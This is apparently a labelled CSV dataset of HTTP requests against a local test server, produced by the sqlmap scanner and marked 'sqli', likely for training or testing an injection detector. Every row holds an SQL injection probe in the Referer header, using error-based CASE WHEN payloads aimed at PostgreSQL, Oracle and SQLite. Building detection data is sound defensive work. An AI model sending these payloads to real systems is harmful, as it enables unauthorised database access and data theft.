method,url,headers,body,label
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND (SELECT (CASE WHEN (9190=2079) THEN NULL ELSE CAST((CHR(74)||CHR(105)||CHR(108)||CHR(111)) AS NUMERIC) END)) IS NULL AND (('oKyW'='oKyW"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9'))) AND (SELECT (CASE WHEN (2144=5076) THEN NULL ELSE CAST((CHR(108)||CHR(76)||CHR(115)||CHR(108)) AS NUMERIC) END)) IS NULL AND ((('ALwP'='ALwP"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (1372=1851) THEN NULL ELSE CAST((CHR(76)||CHR(82)||CHR(110)||CHR(87)) AS NUMERIC) END)) IS NULL AND 'XqwS'='XqwS"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND (SELECT (CASE WHEN (7741=8684) THEN NULL ELSE CAST((CHR(98)||CHR(73)||CHR(80)||CHR(88)) AS NUMERIC) END)) IS NULL AND ('eyGj' LIKE 'eyGj"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND (SELECT (CASE WHEN (7402=1409) THEN NULL ELSE CAST((CHR(81)||CHR(71)||CHR(106)||CHR(110)) AS NUMERIC) END)) IS NULL AND (('udya' LIKE 'udya"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9%' AND (SELECT (CASE WHEN (3799=8942) THEN NULL ELSE CAST((CHR(89)||CHR(71)||CHR(66)||CHR(98)) AS NUMERIC) END)) IS NULL AND 'pOBV%'='pOBV"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (7464=5773) THEN NULL ELSE CAST((CHR(98)||CHR(83)||CHR(80)||CHR(112)) AS NUMERIC) END)) IS NULL AND 'mZIb' LIKE 'mZIb"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND (SELECT (CASE WHEN (1496=4543) THEN NULL ELSE CAST((CHR(120)||CHR(111)||CHR(115)||CHR(97)) AS NUMERIC) END)) IS NULL AND (\""QbJj\""=\""QbJj"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"")) AND (SELECT (CASE WHEN (6229=6289) THEN NULL ELSE CAST((CHR(101)||CHR(104)||CHR(103)||CHR(70)) AS NUMERIC) END)) IS NULL AND ((\""doPu\""=\""doPu"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND (SELECT (CASE WHEN (6897=1323) THEN NULL ELSE CAST((CHR(67)||CHR(73)||CHR(88)||CHR(78)) AS NUMERIC) END)) IS NULL AND \""dFBc\""=\""dFBc"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND (SELECT (CASE WHEN (2344=2186) THEN NULL ELSE CAST((CHR(83)||CHR(117)||CHR(102)||CHR(88)) AS NUMERIC) END)) IS NULL AND (\""ICNe\"" LIKE \""ICNe"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND (SELECT (CASE WHEN (8971=9595) THEN NULL ELSE CAST((CHR(115)||CHR(78)||CHR(69)||CHR(98)) AS NUMERIC) END)) IS NULL AND \""tTeW\"" LIKE \""tTeW"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (5148=1573) THEN NULL ELSE CAST((CHR(115)||CHR(73)||CHR(76)||CHR(78)) AS NUMERIC) END)) IS NULL-- YJCE"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (4207=2424) THEN NULL ELSE CAST((CHR(105)||CHR(84)||CHR(78)||CHR(75)) AS NUMERIC) END)) IS NULL# Qljw"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (1532=2422) THEN NULL ELSE CAST((CHR(86)||CHR(110)||CHR(101)||CHR(110)) AS NUMERIC) END)) IS NULL OR 'aMmU'='BmVa"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND (SELECT (CASE WHEN (5766=9022) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5766) END) FROM DUAL) IS NULL-- zWQY"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (5324=4075) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5324) END) FROM DUAL) IS NULL-- hUrA"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND (SELECT (CASE WHEN (9756=3354) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9756) END) FROM DUAL) IS NULL AND (1725=1725"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9)) AND (SELECT (CASE WHEN (9062=6903) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9062) END) FROM DUAL) IS NULL AND ((8838=8838"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9))) AND (SELECT (CASE WHEN (6414=3705) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6414) END) FROM DUAL) IS NULL AND (((2552=2552"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (8576=5497) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8576) END) FROM DUAL) IS NULL"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND (SELECT (CASE WHEN (8802=6713) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8802) END) FROM DUAL) IS NULL AND ('Xcjz'='Xcjz"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND (SELECT (CASE WHEN (3983=7579) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3983) END) FROM DUAL) IS NULL AND (('hkft'='hkft"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9'))) AND (SELECT (CASE WHEN (5252=8358) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5252) END) FROM DUAL) IS NULL AND ((('nQvz'='nQvz"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (8674=3238) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8674) END) FROM DUAL) IS NULL AND 'JLWh'='JLWh"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND (SELECT (CASE WHEN (2903=8185) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2903) END) FROM DUAL) IS NULL AND ('MNjg' LIKE 'MNjg"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND (SELECT (CASE WHEN (5127=9529) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5127) END) FROM DUAL) IS NULL AND (('FTGG' LIKE 'FTGG"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9%' AND (SELECT (CASE WHEN (6264=3788) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6264) END) FROM DUAL) IS NULL AND 'oPim%'='oPim"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (1938=1637) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1938) END) FROM DUAL) IS NULL AND 'ybjP' LIKE 'ybjP"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND (SELECT (CASE WHEN (9365=7444) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9365) END) FROM DUAL) IS NULL AND (\""exFd\""=\""exFd"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"")) AND (SELECT (CASE WHEN (5914=5320) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5914) END) FROM DUAL) IS NULL AND ((\""HEbN\""=\""HEbN"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND (SELECT (CASE WHEN (1650=1663) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1650) END) FROM DUAL) IS NULL AND \""dhiV\""=\""dhiV"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"") AND (SELECT (CASE WHEN (4243=4531) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4243) END) FROM DUAL) IS NULL AND (\""ROty\"" LIKE \""ROty"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9\"" AND (SELECT (CASE WHEN (6144=3459) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6144) END) FROM DUAL) IS NULL AND \""XoYP\"" LIKE \""XoYP"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (7839=2577) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7839) END) FROM DUAL) IS NULL-- YFuq"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND (SELECT (CASE WHEN (5240=8980) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5240) END) FROM DUAL) IS NULL# RgWX"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND (SELECT (CASE WHEN (5309=8335) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5309) END) FROM DUAL) IS NULL OR 'Qwoc'='iVQM"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND CASE WHEN 4728=7711 THEN 4728 ELSE JSON(CHAR(71,102,74,116)) END-- mZzH"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND CASE WHEN 4123=8327 THEN 4123 ELSE JSON(CHAR(69,116,118,74)) END-- NMsD"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9) AND CASE WHEN 6362=5824 THEN 6362 ELSE JSON(CHAR(98,114,83,73)) END AND (2103=2103"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9)) AND CASE WHEN 3537=2109 THEN 3537 ELSE JSON(CHAR(74,106,88,112)) END AND ((6142=6142"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9))) AND CASE WHEN 4392=3800 THEN 4392 ELSE JSON(CHAR(101,80,111,79)) END AND (((3376=3376"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9 AND CASE WHEN 1874=6964 THEN 1874 ELSE JSON(CHAR(81,113,79,66)) END"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9') AND CASE WHEN 9519=2782 THEN 9519 ELSE JSON(CHAR(87,122,80,121)) END AND ('qMPU'='qMPU"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9')) AND CASE WHEN 7663=6337 THEN 7663 ELSE JSON(CHAR(80,117,81,86)) END AND (('UeeG'='UeeG"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9'))) AND CASE WHEN 3727=4086 THEN 3727 ELSE JSON(CHAR(98,121,68,79)) END AND ((('jVJJ'='jVJJ"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
GET,http://localhost:8081/apps/app-mu55e8a9?id=1,"{""Cache-control"": ""no-cache"", ""User-agent"": ""sqlmap/1.10.9#stable (https://sqlmap.org)"", ""Referer"": ""http://localhost:8081/apps/app-mu55e8a9' AND CASE WHEN 3860=9108 THEN 3860 ELSE JSON(CHAR(67,119,101,74)) END AND 'kfgs'='kfgs"", ""Host"": ""localhost:8081"", ""Accept"": ""*/*"", ""Accept-encoding"": ""gzip,deflate,br,zstd"", ""Connection"": ""keep-alive""}",,sqli
